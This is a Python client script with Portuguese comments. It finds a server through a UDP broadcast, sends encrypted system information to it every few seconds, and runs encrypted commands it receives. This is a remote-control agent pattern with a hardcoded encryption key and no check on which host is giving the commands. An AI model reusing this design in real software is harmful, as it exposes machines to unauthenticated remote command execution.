import socket
import json
import time
import threading
from cryptography.fernet import Fernet

from system import System

# Chave de criptografia (deve ser a mesma no servidor e no cliente)
CryptKey = 'XXHQzo1N9eKRkpw3dhLurZ6c2qK9w5W7smB2UmFXTl0='
BROADCAST_PORT = 50000  # Porta para broadcast UDP
TCP_PORT = 50001  # Porta para conexão TCP

class Client:
    tcp_sock = None  # Socket TCP para comunicação com o servidor

    @staticmethod
    def get_server_ip():
        """Escuta o broadcast uma única vez e obtém o IP do servidor."""
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        udp_sock.bind(('', BROADCAST_PORT))
        
        print("Cliente: Aguardando broadcast ping para detectar servidor...")
        data, addr = udp_sock.recvfrom(1024)
        if data.decode() == "FGG":
            print(f"Cliente: Ping recebido de {addr}, servidor detectado em {addr[0]}")
            udp_sock.close()
            return addr[0]
        udp_sock.close()
        return None

    @staticmethod
    def connect(server_ip):
        """Estabelece a conexão com o servidor e armazena o socket como atributo estático."""
        try:
            Client.tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Client.tcp_sock.connect((server_ip, TCP_PORT))
            print(f"Cliente: Conectado ao servidor {server_ip}:{TCP_PORT}")
        except Exception as e:
            print(f"Erro ao conectar ao servidor: {e}")
            Client.tcp_sock = None

    @staticmethod
    def receive_commands():
        """Escuta comandos do servidor em loop."""
        cipher_suite = Fernet(CryptKey)
        while True:
            if Client.tcp_sock is None:
                time.sleep(1)
                continue
            try:
                data = Client.tcp_sock.recv(4096)
                if not data:
                    raise ConnectionError("Conexão fechada pelo servidor")
                comando_criptografado = cipher_suite.decrypt(data)
                comando = comando_criptografado.decode()
                System.process_cmd(comando)
            except Exception as e:
                print(f"Erro ao receber comando: {e}")
                if Client.tcp_sock:
                    Client.tcp_sock.close()
                Client.tcp_sock = None

    @staticmethod
    def Data_Transfer():
        """Envia um JSON com dados do sistema para o servidor periodicamente."""
        print('Cliente: Iniciando transferência de dados')
        cipher_suite = Fernet(CryptKey)
        while True:
            time.sleep(5)  
            if Client.tcp_sock is None:
                print("Cliente: Não conectado. Tentando reconectar...")
                server_ip = Client.get_server_ip()
                if server_ip:
                    Client.connect(server_ip)
                else:
                    continue  # Tentar novamente mais tarde
            
            try:
                dados_sistema = System.get_system_info()
                json_message = json.dumps(dados_sistema)
                dados_criptografados = cipher_suite.encrypt(json_message.encode())
                Client.tcp_sock.send(dados_criptografados)
                print("Dados enviados com sucesso.")
            except Exception as e:
                print(f"Erro ao enviar dados: {e}")
                if Client.tcp_sock:
                    Client.tcp_sock.close()
                Client.tcp_sock = None

    @staticmethod
    def run():
        """Executa o cliente com threads para envio e recepção."""
        server_ip = Client.get_server_ip()
        if server_ip:
            Client.connect(server_ip)
            # Thread para receber comandos
            threading.Thread(target=Client.receive_commands, daemon=True).start()
            # Thread principal envia dados
            Client.Data_Transfer()
        else:
            print("Cliente: Nenhum servidor encontrado. Encerrando.")


Client.run()